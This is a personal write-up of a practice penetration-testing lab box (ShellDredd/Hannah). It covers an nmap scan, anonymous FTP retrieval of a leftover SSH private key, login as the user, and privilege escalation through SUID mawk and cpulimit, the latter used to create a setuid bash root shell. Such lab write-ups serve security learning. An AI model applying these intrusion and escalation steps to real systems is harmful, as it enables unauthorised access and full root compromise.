Started the OSCP playground box to get warmed up again on boxes. Connected hacking boxes with learning music via sheet music. At first, it's based on sheet music until it's memorized and ingrained in muscle memory.

Target: 192.168.52.130 

Net Scan: nmap -sC -sV -vv -p- 192.168.56.104

PORT      STATE SERVICE REASON  VERSION

21/tcp    open  ftp     syn-ack vsftpd 3.0.3

|_ftp-anon: Anonymous FTP login allowed (FTP code 230)

| ftp-syst: 

|   STAT: 

| FTP server status:

|      Connected to ::ffff:192.168.49.52

|      Logged in as ftp

|      TYPE: ASCII

|      No session bandwidth limit

|      Session timeout in seconds is 300

|      Control connection is plain text

|      Data connections will be plain text

|      At session startup, client count was 1

|      vsFTPd 3.0.3 - secure, fast, stable

|_End of status

61000/tcp open  ssh     syn-ack OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)

| ssh-hostkey: 

|   2048 59:2d:21:0c:2f:af:9d:5a:7b:3e:a4:27:aa:37:89:08 (RSA)

| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDiOZxbr74TmNuWOBDmPInK6nZnRGfOMtZMJDBErXIPCZR9kdZDqJbkdRlnP8QLGuTl/t8qPgP863Rl1yfJLSv995PQ+oUZTSa21cGulVCtFFCKedJJJF9p2cAyYzjeA9qg1Ja7dOPtyPsSCplYzZcILwXZ52mg1k8VH2HUZ7DO0wMBYWONhkXWRR49gMN+IKge3DXNrfyHtnjMVWTwEtfqjFd+D70qi7UusZyfP2MogDX7LgRWC9RmvS6o8KxYW4psLWDB2dp/Nf3FitenY0UMPKkHrxxjeqfYZhFwENmHAsxzrHJo1acSrNMUbTdWuLzcLHQgMIYMUlmGvDkg31c/

|   256 59:26:da:44:3b:97:d2:30:b1:9b:9b:02:74:8b:87:58 (ECDSA)

| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNXNPAPJkUYF4+uu955+0RpMZKriG9olCwtkPB3j5XbiiB+B7WEVv331ittcLxibSBWqV2OO328ThebB2YF9qvI=

|   256 8e:ad:10:4f:e3:3e:65:28:40:cb:5b:bf:1d:24:7f:17 (ED25519)

|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP5tk066endR9DMYxXzxhixx6c8cQ0HjGvYbtL8Lgv91

Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

#Linux target

FTP is open with anonymous FTP login

ftp 192.168.52.130

Connected to 192.168.52.130.

220 (vsFTPd 3.0.3)

Name (192.168.52.130:kali): anonymous

331 Please specify the password.

Password: 

230 Login successful.

Remote system type is UNIX.

Using binary mode to transfer files.

ftp> 

Now to look for files

ftp> ls -alt

229 Entering Extended Passive Mode (|||60483|)

150 Here comes the directory listing.

drwxr-xr-x    3 0        115          4096 Aug 06  2020 ..

drwxr-xr-x    3 0        115          4096 Aug 06  2020 .

drwxr-xr-x    2 0        0            4096 Aug 06  2020 .hannah

226 Directory send OK.

ftp> cd .hannah

250 Directory successfully changed.

ftp> ls -alt

229 Entering Extended Passive Mode (|||22190|)

150 Here comes the directory listing.

drwxr-xr-x    3 0        115          4096 Aug 06  2020 ..

drwxr-xr-x    2 0        0            4096 Aug 06  2020 .

-rwxr-xr-x    1 0        0            1823 Aug 06  2020 id_rsa

Found an SSH ID for Hannah. Now to download

ftp> get id_rsa

local: id_rsa remote: id_rsa

229 Entering Extended Passive Mode (|||19319|)

150 Opening BINARY mode data connection for id_rsa (1823 bytes).

100% |********************************|  1823        1.25 MiB/s    00:00 ETA

226 Transfer complete.

1823 bytes received in 00:00 (867.15 KiB/s)

ftp> 

Now before using the rsa id file I'll need to update it's permissions so that it can be used with SSH. The SSH key requires a specific set of permissions where it needs read and write permissions on the User or Owner so I'll add 600 permission for the minimum priviledges required.

chmod 600 id_rsa

Now time to connect to Hannah

ssh -i id_rsa hannah@192.168.56.104 -p 61000

ssh

-i = id file

-p port

I'm in

??$ ssh -i id_rsa hannah@192.168.52.130 -p 61000

The authenticity of host '[192.168.52.130]:61000 ([192.168.52.130]:61000)' can't be established.

ED25519 key fingerprint is SHA256:6tx3ODoidGvtQl+T9gJivu3xnndw7PXje1XLn+lZuSM.

This key is not known by any other names

Are you sure you want to continue connecting (yes/no/[fingerprint])? yes

Warning: Permanently added '[192.168.52.130]:61000' (ED25519) to the list of known hosts.

Linux ShellDredd 4.19.0-10-amd64 #1 SMP Debian 4.19.132-1 (2020-07-24) x86_64

The programs included with the Debian GNU/Linux system are free software;

the exact distribution terms for each program are described in the

individual files in /usr/share/doc/*/copyright.

  

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent

permitted by applicable law.

hannah@ShellDredd:~$ 

Now to look around

hannah@ShellDredd:~$ ls -alt

total 32

-rw-r--r-- 1 hannah hannah   33 Feb 26 20:40 local.txt

drwxr-xr-x 3 hannah hannah 4096 Jan 29  2021 .

-rw-r--r-- 1 hannah hannah   32 Jan 29  2021 user.txt

lrwxrwxrwx 1 root   root      9 Jan 21  2021 .bash_history -> /dev/null

drwxr-xr-x 2 root   root   4096 Aug  6  2020 .ssh

-rw-r--r-- 1 hannah hannah  220 Aug  6  2020 .bash_logout

-rw-r--r-- 1 hannah hannah 3526 Aug  6  2020 .bashrc

-rw-r--r-- 1 hannah hannah  807 Aug  6  2020 .profile

drwxr-xr-x 3 root   root   4096 Aug  6  2020 ..

hannah@ShellDredd:~$ cat user.txt 

Your flag is in another file...

hannah@ShellDredd:~$ cat local.txt 

db159408536649c7eb5989777af6c8e2

hannah@ShellDredd:~$

Search for SUID permission programs

hannah@ShellDredd:~$ find / -perm -4000 2>/dev/null

/usr/lib/eject/dmcrypt-get-device

/usr/lib/dbus-1.0/dbus-daemon-launch-helper

/usr/lib/openssh/ssh-keysign

/usr/bin/gpasswd

/usr/bin/newgrp

/usr/bin/umount

/usr/bin/mawk

/usr/bin/chfn

/usr/bin/su

/usr/bin/chsh

/usr/bin/fusermount

/usr/bin/cpulimit

/usr/bin/mount

/usr/bin/passwd

hannah@ShellDredd:~$ 

Two binaries that can be used to escalate to root.

MAWK

As the SUID bit is set on this binary, we can use mawk to do a privileged read of the /root/root.txt file.

First, we'll set an environment variable of the file we want to read (/root/root.txt):

ROOT_FLAG=/root/root.txt

We can then run the mawk command and pass in the above variable:

mawk '//' "$ROOT_FLAG"

CPULIMIT

Man Page

       -l, --limit=N

              percentage of CPU allowed from 1 up. Usually 1 - 100, but can

              be higher on multi-core CPUs. (mandatory)

       -f, --foreground

              run cpulimit in foreground while waiting for launched process

              to finish

Now to use -f for privilege escalation

hannah@ShellDredd:~$ cd /tmp/

hannah@ShellDredd:/tmp$ cpulimit -l 100 -f mkdir /temp

Process 1274 detected

Child process is finished, exiting...

hannah@ShellDredd:/tmp$ cpulimit -l 100 -f chmod 4755 /use/bin/bash

Process 1280 detected

chmod: cannot access '/use/bin/bash': No such file or directory

Child process is finished, exiting...

hannah@ShellDredd:/tmp$ cpulimit -l 100 -f cp /usr/bin/bash /temp

Process 1294 detected

Child process is finished, exiting...

hannah@ShellDredd:/tmp$ cpulimit -l 100 -f chmod +s /temp/bash   

Process 1296 detected

Child process is finished, exiting...

hannah@ShellDredd:/tmp$ cd /

hannah@ShellDredd:/$ ls

bin   home            lib32       media  root  sys   var

boot  initrd.img      lib64       mnt    run   temp  vmlinuz

dev   initrd.img.old  libx32      opt    sbin  tmp   vmlinuz.old

etc   lib             lost+found  proc   srv   usr

hannah@ShellDredd:/$ cd temp/

hannah@ShellDredd:/temp$ ./bash -p

bash-5.0# cd root

bash: cd: root: No such file or directory

bash-5.0# cd /root

bash-5.0# ls

proof.txt  root.txt

bash-5.0# cat root.txt 

Your flag is in another file...

bash-5.0# cat proof.txt 

c2a2e74b3fb38ef1d7dfba26a65760da

I like the CPULIMIT method myself since it makes more sense. Basically, CPULIMIT is a cpu tool that also has the ability to run a command. This one feature is utilized to escalate privileges.

Went through [this TTP for recon](https://blog.razrsec.uk/shelldredd-hannah-walkthrough/) and [this TTP for privilege escalation](https://www.hackingarticles.in/shelldredd-1-hannah-vulnhub-walkthrough/)